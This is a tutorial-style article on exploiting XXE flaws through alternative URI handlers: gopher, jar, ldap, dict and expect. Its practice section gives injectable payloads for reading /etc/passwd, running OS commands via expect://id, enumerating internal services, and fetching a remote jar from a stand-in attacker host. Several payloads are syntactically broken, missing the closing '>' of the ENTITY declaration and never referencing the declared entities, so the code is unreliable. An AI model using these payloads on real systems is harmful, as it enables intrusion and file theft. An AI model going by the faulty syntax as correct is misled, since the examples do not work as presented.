---
title: Alternative Protocol Handlers in XXE Explained
description: 'Explore advanced XXE exploitation via alternative protocol handlers:
  gopher, jar, ldap. Learn their capabilities and techniques.'
keywords:
- XXE exploitation
- alternative protocol handlers
- gopher protocol
- jar protocol
- ldap handler
- dict protocol
- expect protocol
- XML External Entity attacks
---

# Alternative Protocol Handlers

## Context

The purpose of this article is to demonstrate how alternative protocol handlers can be exploited in XML External Entity (XXE) attacks. These handlers, including gopher, jar, ldap, dict, expect, and netdoc, allow for advanced payload delivery and increased impact. It is assumed that readers are familiar with the basics of XML External Entities (XXE) and the standard protocol handler exploitation techniques such as FTP and HTTP/HTTPS.

## Theory

### Alternative Protocol Handlers in XXE

Alternative protocol handlers involve non-standard URI schemes such as gopher, jar, ldap, dict, expect, and netdoc to enhance the effectiveness of XXE payloads. These handlers extend the attack surface beyond the conventional HTTP and FTP methods. In an attack scenario, the attacker crafts an XXE payload that references a non-standard protocol, which can trigger specific backend actions that are otherwise unachievable through traditional means.

### Protocol Handler Capabilities and Use Cases

Each protocol handler provides unique capabilities for interacting with backend systems. For instance, the gopher protocol can be used for raw TCP interactions, while the ldap handler can query directory services. The vulnerability model in this case involves an application that allows external entity resolution and supports the given protocol handler. Some handlers, like gopher or ldap, can even bypass network restrictions or induce Server-Side Request Forgery (SSRF)-like behaviors, making them particularly valuable to attackers.

### Protocol Chaining and Custom Handlers

Protocol chaining can be used to combine multiple protocols (for example, jar+http) in order to bypass filters or escalate the attack's impact. When applications implement custom or inadequately filtered handlers, it can lead to unexpected backend access. This emphasizes the need to be aware of such potential weaknesses when crafting XXE payloads.

## Practice

### Gopher Protocol XXE for Arbitrary TCP Payloads

- **Payload:**

  ```xml
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "gopher://target:port/_PAYLOAD">]>
  ```

  Replace `target`, `port`, and `_PAYLOAD` with the desired values to exploit this handler.

- **Execution:**
  - Inject this payload into an XML input that is processed by a vulnerable application.

- **Expected Outcome:**
  - The backend server sends arbitrary data to internal or external services using the gopher protocol.

### JAR Protocol XXE for File Read/SSRF

- **Payload:**

  ```xml
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "jar:file:///etc/passwd!/"]>
  ```

  This tries to read local files using the jar protocol handler.

- **Execution:**
  - Submit this payload to an XXE-vulnerable endpoint.

- **Expected Outcome:**
  - File contents may be returned if the handler supports this operation, providing filesystem access.

### LDAP Protocol XXE for Internal Enumeration

- **Payload:**

  ```xml
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "ldap://localhost:389/o=example">]>
  ```

  Targets an internal LDAP service for enumeration or SSRF attacks.

- **Execution:**
  - Inject the payload and observe the backend LDAP queries.

- **Expected Outcome:**
  - Enumerates or interacts with internal LDAP services, potentially leaking sensitive data.

### DICT Protocol XXE for Service Discovery

- **Payload:**

  ```xml
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "dict://localhost:2628/"]>
  ```

  Attempts to connect to a DICT service for discovery or SSRF.

- **Execution:**
  - Inject the payload and monitor for backend DICT service requests.

- **Expected Outcome:**
  - Discover internal services like DICT or others within the network.

### EXPECT Protocol XXE for Command Execution (if supported)

- **Payload:**

  ```xml
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "expect://id">]>
  ```

  Attempts OS command execution via the expect handler.

- **Execution:**
  - Submit this payload to the vulnerable endpoint.

- **Expected Outcome:**
  - Execute OS commands, with results returned if the handler is enabled and not restricted.

### Protocol Chaining for Filter Bypass

- **Payload:**

  ```xml
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "jar:http://attacker.com/payload.jar!/"]>
  ```

  Combines jar and http to bypass filters or trigger remote file access.

- **Execution:**
  - Inject the chained protocol payload into an XXE vector.

- **Expected Outcome:**
  - Continued exploitation by bypassing input validation or escalating XXE impact through protocol chaining.

## Tools

- **Burp Suite**
- **XXEinjector**
- **Custom Python scripts**